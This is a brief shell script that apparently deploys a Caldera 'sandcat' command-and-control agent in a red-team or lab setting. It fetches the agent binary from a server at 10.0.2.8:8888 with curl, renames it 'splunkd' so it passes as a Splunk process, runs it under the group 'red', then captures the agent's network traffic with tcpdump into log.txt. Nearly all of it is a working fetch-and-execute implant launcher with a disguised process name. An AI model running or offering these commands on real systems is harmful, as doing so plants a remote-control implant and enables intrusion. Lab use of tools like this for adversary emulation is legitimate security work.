server="http://10.0.2.8:8888";
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > splunkd;
chmod +x splunkd;
./splunkd -server $server -group red -v & port_apt=$(sudo lsof -i | grep splunkd | awk 'NR==1 {print $9}' | grep -Eo '[0-9]{1,5}' | awk 'NR==1 {print $1}') && tcpdump -A -s 0 "tcp port $port_apt and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)" >> log.txt fg
